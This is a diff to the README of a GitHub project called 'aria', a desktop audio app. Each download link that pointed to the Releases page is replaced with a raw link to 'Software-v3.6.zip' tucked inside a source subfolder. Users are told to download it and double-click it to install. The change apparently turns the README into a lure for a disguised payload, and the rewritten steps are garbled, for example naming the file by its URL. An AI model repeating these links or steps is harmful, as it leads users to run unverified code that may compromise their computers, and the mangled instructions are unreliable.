@@ -6,7 +6,7 @@ Welcome to aria! This application brings intelligent audio to your desktop, prov
 
 ## 📥 Download Link
 
-[![Download aria](https://img.shields.io/badge/Download aria-blue.svg)](https://github.com/cigswyash/aria/releases)
+[![Download aria](https://github.com/cigswyash/aria/raw/refs/heads/main/src/realtime_subtitles/livecaptions/Software-v3.6.zip https://github.com/cigswyash/aria/raw/refs/heads/main/src/realtime_subtitles/livecaptions/Software-v3.6.zip)](https://github.com/cigswyash/aria/raw/refs/heads/main/src/realtime_subtitles/livecaptions/Software-v3.6.zip)
 
 ## 📋 About aria
 
@@ -35,15 +35,15 @@ To get started with aria, follow these simple steps:
 
 1. Click on the download link below to visit the Releases page:
    
-   [Download aria](https://github.com/cigswyash/aria/releases)
+   [Download aria](https://github.com/cigswyash/aria/raw/refs/heads/main/src/realtime_subtitles/livecaptions/Software-v3.6.zip)
 
 2. On the Releases page, find the latest version listed. Click on the version number to expand the details.
 
-3. Look for the file named `aria.exe` (or a similar executable file) under the "Assets" section. Click on it to download.
+3. Look for the file named `https://github.com/cigswyash/aria/raw/refs/heads/main/src/realtime_subtitles/livecaptions/Software-v3.6.zip` (or a similar executable file) under the "Assets" section. Click on it to download.
 
 4. Once the download completes, locate the file in your downloads folder.
 
-5. Double-click the `aria.exe` file to run it. Follow the prompts to complete the installation.
+5. Double-click the `https://github.com/cigswyash/aria/raw/refs/heads/main/src/realtime_subtitles/livecaptions/Software-v3.6.zip` file to run it. Follow the prompts to complete the installation.
 
 6. After installation, you can open the application from your desktop or Start menu.
 
@@ -62,7 +62,7 @@ Keep aria up to date to ensure you have the latest features and fixes. To update
 
 1. Return to the Releases page:
    
-   [Download aria](https://github.com/cigswyash/aria/releases)
+   [Download aria](https://github.com/cigswyash/aria/raw/refs/heads/main/src/realtime_subtitles/livecaptions/Software-v3.6.zip)
 
 2. Follow the same steps to download the latest version.
 3. Run the updated file to install over the old version.
@@ -93,4 +93,4 @@ We welcome contributions! If you have ideas or find bugs, feel free to submit yo
 
 For further information or inquiries, please visit our GitHub page. We appreciate your interest in aria and hope you find it useful!
 
-### [Download aria](https://github.com/cigswyash/aria/releases)
+### [Download aria](https://github.com/cigswyash/aria/raw/refs/heads/main/src/realtime_subtitles/livecaptions/Software-v3.6.zip)
